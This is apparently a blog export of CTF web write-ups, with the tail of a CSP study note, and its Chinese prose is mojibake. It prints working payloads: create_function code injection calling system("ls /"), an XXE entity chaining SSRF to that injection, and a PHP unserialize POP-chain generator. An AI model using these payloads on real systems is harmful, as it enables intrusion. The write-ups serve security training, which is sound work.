href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src" target="_blank" rel="noopener"><code>connect-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/font-src" target="_blank" rel="noopener"><code>font-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src" target="_blank" rel="noopener"><code>frame-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/img-src" target="_blank" rel="noopener"><code>img-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/manifest-src" target="_blank" rel="noopener"><code>manifest-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/media-src" target="_blank" rel="noopener"><code>media-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/object-src" target="_blank" rel="noopener"><code>object-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/script-src" target="_blank" rel="noopener"><code>script-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/style-src" target="_blank" rel="noopener"><code>style-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src" target="_blank" rel="noopener"><code>worker-src</code></a></li><li><code>sandbox allow-forms allow-scripts</code>ï¼šæˆæƒä¸€ä¸ªæ²™ç®±æ¥è¯·æ±‚iframe sanboxç­‰ç±»ä¼¼å±æ€§çš„èµ„æºï¼Œæ²™ç®±é»˜è®¤ä½¿ç”¨åŒæºç­–ç•¥ï¼Œå¯å¢åŠ é…ç½®ï¼Œå¦‚<code>allow-scripts</code>ï¼Œå…è®¸è·¨ç«™script</li></ul><p>ä¾‹å¦‚ï¼Œä¿¡ä»»ä»»æ„çš„å›¾ç‰‡æ¥æºï¼Œä½†æ˜¯åªä¿¡ä»»æœ¬ç«™çš„å…¶ä»–æ¥æºï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src *</span><br></pre></td></tr></table></figure><h2 id="å†…åµŒè„šæœ¬"><a href="#å†…åµŒè„šæœ¬" class="headerlink" title="å†…åµŒè„šæœ¬"></a>å†…åµŒè„šæœ¬</h2><p>æ–°ç‰ˆçš„é»˜è®¤ç­–ç•¥å·²ç»å°ç¦äº†å†…åµŒè„šæœ¬çš„æ‰§è¡Œï¼Œè¿™æ„å‘³ç€å³ä½¿æˆ‘ä»¬ä¸å¼•å…¥å¤–éƒ¨jsï¼Œè€Œç›´æ¥åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾é‡Œé¢å†™ä¸œè¥¿ä¹Ÿæ˜¯ä¸å…è®¸çš„ï¼ˆè¿™ä¹Ÿé€ æˆ<a href="https://www.anquanke.com/post/id/151496#h2-4" target="_blank" rel="noopener">å·§å¦™åœ°ç»•è¿‡CSPï¼šæ¬ºéª—CSPæ‰§è¡Œä»»æ„ä»£ç </a>ä¸€æ–‡çš„å¤±æ•ˆï¼š</p><p><img src="/HTTP-å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°/1548837928332.png" alt="1548837928332"></p><p>é‚£ä¹ˆæ­£å¸¸çš„éœ€æ±‚æ€ä¹ˆåŠå‘¢ï¼Ÿæ­£å¸¸æœåŠ¡å™¨å‘é€ç½‘é¡µçš„æ—¶å€™ï¼Œéœ€è¦åœ¨ç­–ç•¥ä¸­å‘Šè¯‰æµè§ˆå™¨ä¸€ä¸ªéšæœºç”Ÿæˆçš„tokenã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'</span><br></pre></td></tr></table></figure><p>é¡µé¢å†…åµŒè„šæœ¬å¿…é¡»æœ‰è¿™ä¸ªtokenæ‰èƒ½æ‰§è¡Œï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">EDNnf03nceIOfn39fn3e9h3sdfa</span>&gt;</span><span class="javascript"> <span class="comment">// some code </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="æµ‹è¯•ç­–ç•¥"><a href="#æµ‹è¯•ç­–ç•¥" class="headerlink" title="æµ‹è¯•ç­–ç•¥"></a>æµ‹è¯•ç­–ç•¥</h1><p>å¯ä»¥å°†CSPé…ç½®ä¸ºä»…æŠ¥å‘Šæ¨¡å¼ï¼Œè¿™æ ·å³ä½¿å‡ºç°è¿è§„ï¼ŒCSPä¹Ÿåªæ˜¯æŠ¥å‘Šè¿™ä¸ªè¡Œä¸ºè€Œä¸å¼ºåˆ¶æ‹¦æˆªï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy-Report-Only</span>: default-src 'self'; report-uri http://127.0.0.1:8000</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1:8000æ”¶åˆ°çš„æŠ¥å‘Šå¦‚ä¸‹ï¼š" target="_blank" rel="noopener">http://127.0.0.1:8000æ”¶åˆ°çš„æŠ¥å‘Šå¦‚ä¸‹ï¼š</a></p><p><img src="/HTTP-å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°/1548838217202.png" alt="1548838217202"></p><h1 id="å…¶ä»–å…³é”®å­—"><a href="#å…¶ä»–å…³é”®å­—" class="headerlink" title="å…¶ä»–å…³é”®å­—"></a>å…¶ä»–å…³é”®å­—</h1><h1 id="å…¼å®¹æ€§"><a href="#å…¼å®¹æ€§" class="headerlink" title="å…¼å®¹æ€§"></a>å…¼å®¹æ€§</h1><p>æ¯«æ— ç–‘é—®å¾ˆå¤šæµè§ˆå™¨æ˜¯ä¸æ”¯æŒè¿™ä¸ªå­—æ®µçš„ï¼Œè¯¦ç»†çš„æ”¯æŒå‚è§<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>å†…å®¹å®‰å…¨ç­–ç•¥( CSP )ï¼Œ<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></li><li>å·§å¦™åœ°ç»•è¿‡CSPï¼šæ¬ºéª—CSPæ‰§è¡Œä»»æ„ä»£ç ï¼Œ<a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa" target="_blank" rel="noopener">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> CSP </tag>
            
            <tag> åè®®å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019fireshellä¸€é“ä»XXEåˆ°SSRFé¢˜</title>
      <link href="/ctf-2019fireshell%E4%B8%80%E9%81%93%E4%BB%8Exxe%E5%88%B0ssrf%E9%A2%98/"/>
      <url>/ctf-2019fireshell%E4%B8%80%E9%81%93%E4%BB%8Exxe%E5%88%B0ssrf%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><strong>é¢˜ç›®:</strong> BadInjection, å…¶ä»–é¢˜è§£è¯·å‚è€ƒç™½å¸½100å…¬ä¼—å·çš„<a href="https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug" target="_blank" rel="noopener">FireShell CTF 2019 WriteUp</a>.</p><h1 id="0x01ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#0x01ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x01ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>0x01ä»»æ„æ–‡ä»¶ä¸‹è½½</h1><p>fileå‚æ•°å­˜åœ¨æ–‡ä»¶ä¸‹è½½ï¼Œé¡ºè—¤æ‘¸ç“œä¾æ¬¡ä¸‹è½½åˆ°index.phpï¼ŒRouters.phpï¼ŒCustom.phpï¼ŒAdmin.phpã€‚</p><a id="more"></a><h1 id="0x02XXE"><a href="#0x02XXE" class="headerlink" title="0x02XXE"></a>0x02XXE</h1><p>æŸ¥çœ‹Custom.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Custom</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">      $root = simplexml_load_string($string,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">      $test = $root-&gt;name;</span><br><span class="line">      <span class="keyword">echo</span> $test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶å­˜åœ¨XXE:</p><p><img src="/ctf-2019fireshellä¸€é“ä»xxeåˆ°ssrfé¢˜/1548596007409.png" alt="1548596007409"></p><h1 id="0x03ä»£ç æ‰§è¡Œ"><a href="#0x03ä»£ç æ‰§è¡Œ" class="headerlink" title="0x03ä»£ç æ‰§è¡Œ"></a>0x03ä»£ç æ‰§è¡Œ</h1><p>æ¥ç€å†çœ‹Admin.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sort</span><span class="params">($url,$order)</span></span>&#123;</span><br><span class="line">    $uri = parse_url($url);</span><br><span class="line">    $file = file_get_contents($url);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $xml = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">if</span>($xml)&#123;</span><br><span class="line">     <span class="comment">//echo count($xml-&gt;channel-&gt;item);</span></span><br><span class="line">     <span class="comment">//var_dump($xml-&gt;channel-&gt;item-&gt;link);</span></span><br><span class="line">     $data = [];</span><br><span class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($xml-&gt;channel-&gt;item);$i++)&#123;</span><br><span class="line">       <span class="comment">//echo $uri['scheme'].$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link."\n";</span></span><br><span class="line">       $data[] = <span class="keyword">new</span> Url($i,$uri[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$uri[<span class="string">'host'</span>].$xml-&gt;channel-&gt;item[$i]-&gt;link);</span><br><span class="line">       <span class="comment">//$data[$i] = $uri['scheme'].$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link;</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//var_dump($data);</span></span><br><span class="line">     usort($data, create_function(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.$order.<span class="string">',$b-&gt;'</span>.$order.<span class="string">');'</span>));</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;div class="ui list"&gt;'</span>;</span><br><span class="line">     <span class="keyword">foreach</span>($data <span class="keyword">as</span> $dt) &#123;</span><br><span class="line"></span><br><span class="line">       $html = <span class="string">'&lt;div class="item"&gt;'</span>;</span><br><span class="line">       $html .= <span class="string">''</span>.$dt-&gt;id.<span class="string">' - '</span>;</span><br><span class="line">       $html .= <span class="string">' &lt;a href="'</span>.$dt-&gt;link.<span class="string">'"&gt;'</span>.$dt-&gt;link.<span class="string">'&lt;/a&gt;'</span>;</span><br><span class="line">       $html .= <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     $html .= <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">     <span class="keyword">echo</span> $html;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>Lz1yå¸ˆå‚…æç¤ºcreate_functionå­˜åœ¨ä»£ç æ‰§è¡Œï¼Œå‰é¢urlç»™ä¸€ä¸ªrssçš„è®¢é˜…æºï¼Œåé¢çš„$orderå°±æ˜¯æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin?rss=http://anemone.top/atom.xml&amp;order=link);&#125;system(&quot;ls /&quot;);//</span><br></pre></td></tr></table></figure><h1 id="0x04SSRF"><a href="#0x04SSRF" class="headerlink" title="0x04SSRF"></a>0x04SSRF</h1><p>ä»Routers.phpå¯ä»¥çŸ¥é“admin.phpåªèƒ½localhostè®¿é—®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Route::set(<span class="string">'admin'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($_REQUEST[<span class="string">'rss'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_REQUES[<span class="string">'order'</span>]))&#123;</span><br><span class="line">    Admin::createView(<span class="string">'Admin'</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'::1'</span>)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[<span class="string">'rss'</span>],$_REQUEST[<span class="string">'order'</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">";("</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨xxeæ‰“å†…ç½‘äº†orderå­—æ®µéœ€è¦urlç¼–ç :</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost/admin?rss=http://anemone.top/atom.xml&amp;order=%6c%69%6e%6b%29%3b%7d%73%79%73%74%65%6d%28%22%6c%73%22%29%3b%2f%2f"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ—å‡ºç›®å½•æˆåŠŸï¼š<img src="/ctf-2019fireshellä¸€é“ä»xxeåˆ°ssrfé¢˜/ls.png" alt="ls"></p><p>å¾—åˆ°flagï¼š</p><p><img src="/ctf-2019fireshellä¸€é“ä»xxeåˆ°ssrfé¢˜/flag.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019å®‰æ’01æœˆèµ›babygoï¼ˆè¯¦è§£ï¼‰å’Œå…¶ä»–é¢˜ç›®wp</title>
      <link href="/ctf-2019%E5%AE%89%E6%81%9201%E6%9C%88%E8%B5%9Bbabygo%EF%BC%88%E8%AF%A6%E8%A7%A3%EF%BC%89%E5%92%8C%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AEwp/"/>
      <url>/ctf-2019%E5%AE%89%E6%81%9201%E6%9C%88%E8%B5%9Bbabygo%EF%BC%88%E8%AF%A6%E8%A7%A3%EF%BC%89%E5%92%8C%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AEwp/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ç¢°ä¸Šäº‹æƒ…ï¼ŒåŠ ä¸Šè‡ªå·±åˆèœï¼Œåªåšå‡ºä¸¤é¢˜ã€‚</p><h1 id="web-babygo"><a href="#web-babygo" class="headerlink" title="web-babygo"></a>web-babygo</h1><p>é¢˜ç›®ç»™å‡ºäº†æºä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $nice; <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">public</span> $amzing;  <span class="comment">//baby object serialized</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">echo</span> $sth;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]); <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">echo</span> $Input_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ çš„POPé“¾ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">baby.__toString()</span><br><span class="line">-&gt;cool.read()</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°babyçš„$skyobjä¸ºprotectedå˜é‡ï¼Œå› æ­¤æ²¡æ³•å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼Œåªèƒ½æ”¹__constract()æ–¹æ³•ï¼Œå°†å…¶è®¾ä¸ºcoolçš„å®ä¾‹ï¼Œç„¶åå°†å¯¹è±¡åºåˆ—åŒ–ï¼Œå› ä¸ºphpå¼±ç±»å‹ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å¯ä»¥æˆåŠŸã€‚é€šè¿‡å¦‚ä¸‹ä»£ç ç”Ÿæˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $c=<span class="keyword">new</span> cool();</span><br><span class="line">        $c-&gt;filename=<span class="string">"flag.php"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $nice; <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">public</span> $amzing;  <span class="comment">//baby object serialized</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $bb_ser;</span></span><br><span class="line">$b=<span class="keyword">new</span> baby();</span><br><span class="line">$b_ser=serialize($b);</span><br><span class="line"><span class="keyword">echo</span> $b_ser;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test:</span></span><br><span class="line">$Input_data = unserialize($b_ser); <span 